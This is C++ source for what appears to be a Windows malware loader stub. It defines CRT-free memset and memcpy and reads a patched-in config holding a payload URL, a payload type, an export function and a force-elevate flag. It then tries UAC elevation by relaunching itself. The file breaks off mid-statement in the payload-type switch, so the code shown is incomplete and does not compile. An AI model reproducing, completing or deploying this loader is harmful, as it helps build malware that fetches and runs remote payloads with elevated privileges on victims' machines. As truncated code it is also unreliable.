#include "memory.h"
#include "dbg.h"
#include "utils.h"
#include "config.h"
#include "network.h"

#pragma function (memset)
void* memset(void* _Dst, int _Val, size_t _Size)
{
	byte* x = (byte*)_Dst;

	while (_Size--) {
		*x++ = _Val;
	}

	return _Dst;
}

#pragma function (memcpy)
void* memcpy(void* _Dst, const void* _Src, size_t _Size)
{
	byte* x = (byte*)_Dst;
	byte* y = (byte*)_Src;

	while (_Size--)
	{
		*x++ = *y++;
	}

	return _Dst;
}

BYTE config[5000] = { "INSERT_CONFIG_HERE" };

void Entry() {
	if (!Memory::Init() || !Debug::Init(Debug::OutputTypes::kFile)) {
		ExitProcess(ERROR_SUCCESS);
	}

	LPWSTR url = nullptr;
	DWORD payload_type = 0;
	LPWSTR export_function = nullptr;
	bool force_elevate = false;

	if (!Config::ExtractConfig(config, &url, &payload_type, &export_function, &force_elevate)) {
		DBGPRINT(L"File %s, line %d, Config::ExtractConfig error %d", __FILEW__, __LINE__, GetLastError());
		ExitProcess(ERROR_SUCCESS);
	}

	WCHAR current_path[1025] = { 0 };
	DWORD integrity_level = Utils::GetIntegrityLevel();

	GetModuleFileNameW(0, current_path, 1024);
	 
	if (integrity_level <= SECURITY_MANDATORY_LOW_RID) {
		if (!Utils::ElevateUAC(current_path)) {
			DBGPRINT(L"File %s, line %d, Utils::ElevateUAC error %d", __FILEW__, __LINE__, GetLastError());
		}

		ExitProcess(ERROR_SUCCESS);
	}

	if (force_elevate) {
		if (!Utils::IsElevated()) {
			if (!Utils::ElevateUAC(current_path)) {
				DBGPRINT(L"File %s, line %d, Utils::ElevateUAC error %d", __FILEW__, __LINE__, GetLastError());
			}

			ExitProcess(ERROR_SUCCESS);
		}
	}

	switch (payload_type) {
		case Config::
	}
}